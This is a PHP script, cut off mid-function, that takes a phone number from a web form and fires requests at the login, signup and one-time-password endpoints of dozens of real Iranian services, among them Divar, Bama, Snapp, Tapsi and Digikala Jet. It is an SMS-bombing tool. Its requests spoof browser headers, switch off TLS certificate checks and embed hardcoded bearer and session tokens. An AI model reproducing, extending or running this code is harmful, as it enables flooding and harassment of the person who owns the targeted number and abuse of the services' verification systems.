<?php
if (isset($_POST['phone'])) {
    if (preg_match("/^([0][9][0-9]{9})$/", $_POST['phone'])) {
        $phone = $_POST['phone'];
        all($phone);
        header("Location:index.php?ok=true");
    } else {
        header("Location:index.php?number=0");
    }
}
function all($phone)
{
    divar($phone);  //ok
    bama($phone); //ok
    nobatir($phone); //ok
    snapp_express($phone);  //ok
    azki($phone);  //ok
    igap($phone);  //ok
    digikala_jet($phone);  //ok
    snapp_drivers($phone); //ok
    snapp_doctor($phone);  //ok
    shahrefarsh($phone);  //ok
    ostadkar($phone); //ok
    miare($phone);  //ok
    tapsi_drivers($phone); //ok
    tapsi_passenger($phone);   //ok
    banimode($phone); //ok
    taaghche_login($phone);  //ok
    taaghche_signup($phone);  //ok
    mobit($phone); //ok
    jabama($phone);  //ok
    ghabzino($phone); //ok
    komodaa($phone); //ok
    barghe_man($phone); //ok
    behtarino($phone); //ok
    kilid($phone); //ok
    vandar($phone); //ok
    pinorest($phone); //ok
    technolife($phone); //ok
    bit24($phone); //ok
    tetherland($phone); //ok
    alibaba($phone); //ok
    drdr($phone); //ok
    tikban($phone); //ok
    drnext($phone); //ok
    alopeyk_login($phone); // Depends on user status
    alopeyk_signup($phone); // Depends on user status
    digistyle($phone); // Depends on user status
}


function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

function divar($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.divar.ir/v5/auth/authenticate');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.divar.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'dnt: 1',
        'origin: https://divar.ir',
        'referer: https://divar.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-standard-divar-error: true',
        'accept-encoding: gzip',
    ]);
    $phone_value = '{"phone":"' . $phone . '"}';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}


function bama($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://account.bama.ir/api/otp/Generate/v2');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'DNT: 1',
        'Origin: https://bama.ir',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Accept-Encoding: gzip',
    ]);
    $phone_value = '{"cellNumber":"' . $phone . '","appname":"popuplogin","smsfor":6}';

    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}

function nobatir($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://nobat.ir/api/public/patient/login/phone');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: nobat.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'authorization: Bearer undefined',
        'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY',
        'dnt: 1',
        'nobat-cookie: {}',
        'origin: https://user.nobat.ir',
        'referer: https://user.nobat.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    $phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $phone . "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}

function alopeyk_login($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.alopeyk.com/api/v2/login?platform=pwa');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.alopeyk.com',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://app.alopeyk.com',
        'referer: https://app.alopeyk.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    $phone = (int)$phone;  // Removes Zero from the beggining of the number
    $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $phone . '"}';

    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_close($ch);
}

function alopeyk_signup($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.alopeyk.com',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://app.alopeyk.com',
        'referer: https://app.alopeyk.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    $phone_value = "{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"" . $phone . "\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}

function shahrefarsh($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://shahrfarsh.com/Account/Login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: shahrfarsh.com',
        'accept: text/plain, */*; q=0.01',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'dnt: 1',
        'origin: https://shahrfarsh.com',
        'referer: https://shahrfarsh.com/Account/Login',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
        'accept-encoding: gzip',
    ]);
    $phone_value = 'phoneNumber=' . $phone . '';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}

function digistyle($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.digistyle.com/users/login-register/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.digistyle.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'dnt: 1',
        'origin: https://www.digistyle.com',
        'referer: https://www.digistyle.com/users/login-register/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    $phone_value = 'loginRegister%5Bemail_phone%5D=' . $phone . '';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);

    // GET
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.digistyle.com/users/register/confirm/?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ijk4OTEyNDk1MzI4MiIsInNraXBNZXJnZSI6ZmFsc2UsImRpc3BsYXlES0FjY291bnRNb2RhbCI6ZmFsc2V9.HXlwTUU6bb_Y_4jBMROyYv5RBXaWFdsB5CNy4wT_QbI&type=register');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.digistyle.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'cache-control: max-age=0',
        'dnt: 1',
        'referer: https://www.digistyle.com/users/login-register/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function tikban($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://tikban.com/Account/SendTokenForLogin');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: tikban.com',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json;charset=UTF-8',
        'currency: IRR',
        'dnt: 1',
        'origin: https://tikban.com',
        'referer: https://tikban.com/Account/Affiliate',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
        'accept-encoding: gzip',
    ]);
    $phone_value = '{"JustMobilephone":"' . $phone . '","username":"' . $phone . '","phoneNumberCode":"+98","CaptchaKey":null}';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    curl_close($ch);
}


function snapp_express($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.snapp.express',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImViODBkNzYxNjI1OWNmZDA4ZWEzYzkyMjkyZDYzOTc3ZmE2MTJkNGI1ZTM3ZDUwNjg3MWUxODUzYjQ2OTllN2Y3ZGUxMGQyNmRkODYwZDg4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiZWI4MGQ3NjE2MjU5Y2ZkMDhlYTNjOTIyOTJkNjM5NzdmYTYxMmQ0YjVlMzdkNTA2ODcxZTE4NTNiNDY5OWU3ZjdkZTEwZDI2ZGQ4NjBkODgiLCJpYXQiOjE2Nzg3ODQ2MjYsIm5iZiI6MTY3ODc4NDYyNiwiZXhwIjoxNjgxNDU5NTQ2LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdLCJreWMiOjAsInVzZXJDb2RlIjpudWxsLCJzdWJzaWR5IjowfQ.diiWBTcy-3lL-o37hUjOOL-dcd32LFpuLmwlOShqExPMaL50oHraA9rMU8nX9rQmtV3uLmNDD-bzLWC4nQ83Hy1vRMClMPPM2XBIWHYyrfHk7GKn5R3X0ReOHofcbeGbfSCf_NfW3Gw_uqRg7bmf3v5O0muhIQnVbZWyzNrnGj8HBXkSaDa0g5rrqN4qEPnOIbkFAiOW7EnQQ02rXMpftfnA-4R0vYvIrZtRcFokz2BmFdWJPRyzR6qEZHmTOQYgxfL-q3hK1O6nBGIKjiQ037Dmo9Fa0dv1Pv6_CGSVOwhzI7ibjhZe5yf9SHPskfhS_IaRcbZqFu7Y4e8-NiGbxBHYluaBovNyh4L2G4Z_tZHMVNUBRjKEmMUbLiQWE-oTwvCH6Y7BqkGFNN2bPhHD74JMgL_vqMG6K_lUJxnL9fJnO4dWOmsRPwqB2-eaWvcSrFw5_5VJA9wC6esjVnuiPsuzw_dPvzBoGRggDqICwBmzwIzFE8eZ-GicUBn-VLmIW9nGVMBU276i8jknZqk2sXjx4OTRYS7RcwXygeB1zFFBtixzqJeTFNymdc2uDLsG-7gnw1ms00KLrdzUv2QbdVNEZPjjzQ12OH2xWiSsANtLar1CMPddaYbSc2ve8gXrvQDr2UBr3LOeZkyFv-8CyUMIU8VUqPm4zTVHf4aF3F8k2pflZJeTsw1QCwpxE2MUtGq_OblM2MiG591JWlbAjo9ZPWwTlYzFOPcJl7Va5m717FJoJ7C079CkOeV4002J7plai6qvreDGdcglrYXUl3FfrOb06OSiTr-DQke7h5sZM36k9ZSHCafyN5t5-2Fa874yf98dmFokSeqMZw_fmG7yDtcg8pAE-f2TK4SmfI4h-IVAeb4fhv3SHt1m1QY5a8C18JhKUEKJkKYpU_opV9foQ76_PjET_0H8HO1dDFMsL1OQXUjE4lKNCAm_nIyqoYHoROG8vLlQMPo0N_KKgbPJVPLbcJEpUH5vNzXGhDOYEhHEXUJ7355nllQ0tGSNMDUFH3Tj1gto2FLHVSNVq2S0EVqtT7-Xp5sFcV7ccwKRbYDEY3tfB_v6TOWsxWOUG5VET_kst0pOHiXkZHfR2nMzCRwIWIPPaIcRcroKfsX_jVPQyHerF7E9wBmFpidaNZ0tFXPXuYTMM7LWXXMl8VGYICv8Tyiwih5Ka7J4lxxWE3zIr6K616BFA3gLEteS1zx_Dxjb-tdeNS1RNNC3L32EKC-W65Qky6SZssWWyqARB35xujpEkixmDMfTAPhrJdaWcwRBDLWuMkLcbLJ_svbeJ8Ew3ff5zRVisRL5jeK_nzLFFSU3GMryiOiGNYUM6rdaLsUbol2bQxfe0-G9gcZJNPh56HrhUa11-ibFGAqxpI7pkM3SMx8L7-77qqfz3sW3cYIR_tKwM3x9R9-rW0uflXGRqeB-V0ItXAT9NI05O32fqcin4SXExEUKe8tXJi04GiBKTWDNyG0zrcDMA5sm1LfMSGGuvm4gVDMAqxsDa4COq4YZWtWxlyEj3UJhMwX6WxP5eogrGFkyW4yzBDlNKBYYEASpofEY9jk6HmcDOUogwzcC3P474--x58f6kAh2f0-SUjUUK51mVViS8pAbcyj_kutpKYf3h30ABZq0aNkHN462PF0h3dMlyL4eZVEVyuabhyDq1iXueOb_bsDKHsLBgyKNh5pT62hRxWz6eWWomOYUnp5wT0XbT8lAEpSnrOH4B7GqDxanab93-354Zqy-92_IHhW_MxzEDPF2xg6U_BL5fO60bVSStL169tllZ-OROK9XmynWCCvukuiNgxuJtDKGM0h7GaR8Mm8vhjz2ZLvahcOaujyhC9fxkjpvTup3y7yT2JP6pAHhhvrmIScyfWUUbYgjACw32EjVJZTPsyrT8gXhS1d2uGOQ-wP4WqJ6vY6BqU-qvw-uSJgSQQlWQ-i_4MIBGvn3eyF9WCJcDtsdePY7XYmKQdBSjEmEM_vqyZwSW7LskvsahS-ilY5ni9RH2Hk5amBusmQ_GGZ42m7EI3WNu1JJxVgP4QdCaDYMuU9E-kmhfLvfPqYGcFpIXjAzwzAFuE7c0PqMPoPrYx3BUa9rh-HLBwnULc7T06HUeS0d_x8A0AY4XKFMRudeY_1YQ8beUcp-U12TEHIyfVjyAq8HkElm6VWjqNbwRncjAHDhrpAFZuHx6LZWe0RNH_RYZXmbGo2lg3UXS3kWOG6wYjz7TBb8QEm1ibE2FN_6ZO5WLa7Opx0Vk9ugEhkZHwjjCz96T2jOVDgX87CxKTwwJM972ivnGrDTgtRvYFz06sPrbRnSz-shqrOR9ujZbenYodsarasLh3s4DmapA-G1t3vEUpH1XRw7CKOZG_qDc7HfO71itt9YjWnp7b7EhK1FQMAwyW3gInMj-d1QylGqBqEeoPNNHND4ybIaDSBv5mlbufGjPdW_4SFt8OPZHG2q8JA7L4PDvXxb3cGvZi7prvI4a2vpPxklAFizm1mpp6bL8ueEB18xJRjGEcext5Bzab-bmaKvy7p-9QVMxpPQGQtuc0CHt83aHKVcI_epMemjRpU1Sh3M-PCJUReFOuhKpmL5DtodzOA4gyLLKSrTHz6Wf_wIDdTTGNF7HnP5udVTFde86NznCNqCjt5ZrC0z_xrT6XwYO75T3XSW1S9shBbIYEYYAMwfNXja_RYseBNnfVnAHw4YOD_AtHVgi-FZV8ydCJnMWug',
        'content-type: application/x-www-form-urlencoded',
        'dnt: 1',
        'origin: https://snapp.express',
        'referer: https://snapp.express/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    $phone_value = 'cellphone=' . $phone . '&captcha=&optionalLoginToken=true&local=';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function azki($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.azki.com',
        'accept: application/json, text/plain, */*',
        'accept-language: fa',
        'content-type: application/json',
        'device: web',
        'deviceid: 6',
        'dnt: 1',
        'origin: https://www.azki.com',
        'referer: https://www.azki.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'user-name: null',
        'user-token: 7S0qTPKtkl2RAhxbdc1vASgORsUjW4pB393u2lJhUi4K3AQ0ZZbQWCTfuIpLVLFH',
        'accept-encoding: gzip',
    ]);
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);


    curl_close($ch);
}

function igap($phone)
{
    $phone = (int)$phone;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://core.gap.im/v1/user/add.json?mobile=%2B98' . $phone . '');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: core.gap.im',
        'accept: application/json, text/plain, */*',
        'accept-language: fa',
        'appversion: web',
        'dnt: 1',
        'origin: https://web.gap.im',
        'project: gap',
        'referer: https://web.gap.im/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-version: 5.0.0-alpha.97',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function digikala_jet($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.digikalajet.ir/user/login-register/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.digikalajet.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'client: desktop',
        'clientid: 57180d04-0a65-4dc2-9e1c-4f7da8241a3b',
        'clientos: Windows',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://www.digikalajet.com',
        'referer: https://www.digikalajet.com/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: cross-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-request-uuid: 2c7e7fc2-4ffb-43fd-837d-8262af28d48a',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function snapp_drivers($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=' . $phone . '');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: digitalsignup.snapp.ir',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9,fa;q=0.8',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://digitalsignup.snapp.ir',
        'referer: https://digitalsignup.snapp.ir/?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=' . $phone . '',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-app-name: driver-pwa',
        'x-app-version: 2.1.1',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cellphone":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);


    curl_close($ch);
}

function snapp_doctor($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/' . $phone . '/sms?cCode=%2B98');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Accept-Language: fa',
        'Connection: keep-alive',
